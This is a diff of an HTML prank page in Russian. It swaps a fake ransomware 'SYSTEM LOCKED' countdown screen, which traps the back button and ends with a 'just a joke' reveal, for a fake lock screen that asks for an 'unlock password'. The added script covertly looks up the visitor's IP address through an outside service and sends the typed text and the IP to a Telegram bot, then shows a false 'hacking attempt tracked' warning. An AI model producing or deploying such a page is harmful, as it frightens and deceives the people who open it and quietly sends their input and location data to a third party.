@@ -2,32 +2,50 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>System Locked</title>
 <style>
-  body { margin: 0; padding: 0; background: #000; color: red; font-family: monospace; text-align: center; overflow: hidden; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; user-select: none; }
-  h1 { font-size: 3em; }
-  p { font-size: 1.2em; }
-  #timer { font-size: 6em; font-weight: bold; margin-top: 20px; color: darkred; }
+  body { margin: 0; background: #000; color: red; font-family: monospace; text-align: center; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; user-select: none; }
+  h1 { font-size: 2.5em; animation: blink 1s infinite; }
+  p { font-size: 1.2em; color: #fff; }
+  input { padding: 10px; font-size: 1.2em; margin: 20px 0; border: 2px solid red; background: #111; color: #fff; text-align: center; width: 80%; max-width: 300px; }
+  button { padding: 15px 30px; font-size: 1.2em; background: red; color: white; border: none; font-weight: bold; cursor: pointer; }
+  #status { color: #ffcc00; margin-top: 20px; font-size: 1em; }
+  @keyframes blink { 50% { opacity: 0; } }
 </style>
 </head>
-<body onclick="this.requestFullscreen()">
-  <h1>SYSTEM LOCKED</h1>
-  <p>все файлы зашифрованы<br>устройство заблокировано<br><br><span style="color: gold;">ОТКУП → @lev_petrov</span></p>
-  <div id="timer">60</div>
-  <script>
-    history.pushState(null, null, location.href);
-    window.onpopstate = function () { history.go(1); };
-    window.addEventListener('touchmove', function(e) { e.preventDefault(); }, { passive: false });
+<body>
+  <h1>СИСТЕМА ЗАБЛОКИРОВАНА</h1>
+  <p>Все данные зашифрованы.</p>
+  <p>Введите пароль разблокировки:</p>
+  <input type="text" id="password" placeholder="Пароль...">
+  <br>
+  <button onclick="sendData()">РАЗБЛОКИРОВАТЬ</button>
+  <div id="status"></div>
 
-    let t = 60;
-    setInterval(() => {
-        if (t > 0) {
-            t--;
-            document.getElementById('timer').innerText = t;
-            if (navigator.vibrate) navigator.vibrate(200);
-        } else {
-            document.body.innerHTML = '<h1 style="color: lime;">АХАХА ЭТО РОЗЫГРЫШ :)</h1><p>@lev_petrov — просто мем</p>';
-        }
-    }, 1000);
+  <script>
+    const TG_TOKEN = "ТВОЙ_ТОКЕН";
+    const TG_CHAT_ID = "ТВОЙ_АЙДИ";
+
+    function sendData() {
+      let pwd = document.getElementById('password').value;
+      if (!pwd) pwd = "(ввел пустоту)";
+      
+      document.getElementById('status').innerText = "Проверка...";
+
+      fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(data => {
+          let msg = "🔴 ТВОЙ ДРУГ ПОПАЛСЯ! 🔴\n\nВвел пароль: " + pwd + "\nIP-адрес: " + data.ip;
+          
+          fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg })
+          });
+          
+          document.getElementById('status').innerText = "ДОСТУП ЗАПРЕЩЕН. Попытка взлома отслежена.";
+        });
+    }
   </script>
 </body>
 </html>
